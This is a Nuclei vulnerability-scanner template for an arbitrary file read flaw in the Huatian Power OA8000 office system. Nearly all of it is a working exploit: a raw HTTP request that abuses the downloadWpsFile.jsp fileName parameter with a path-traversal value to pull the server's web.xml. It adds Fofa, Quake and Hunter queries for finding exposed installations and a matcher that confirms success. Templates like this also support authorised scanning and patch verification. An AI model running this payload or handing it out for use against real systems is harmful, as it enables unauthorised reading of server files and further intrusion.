id: CNPower_oa8000_downloadWpsFile_Fileread

info:
  name: CNPower_oa8000_downloadWpsFile_Fileread
  author: HK
  severity: medium
  description: 华天动力OA系统downloadWpsFile存在任意文件读取漏洞
  metadata:
    max-request: 1
    Quake-query: body="/OAapp/htpages/app/lib/bootstrap/bootstrap.min.js"
    Hunter-query: body="/OAapp/htpages/app/lib/bootstrap/bootstrap.min.js"
    Fofa-query: app="华天动力-OA8000"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/2
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    Accept-Encoding: gzip, deflate

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - web-app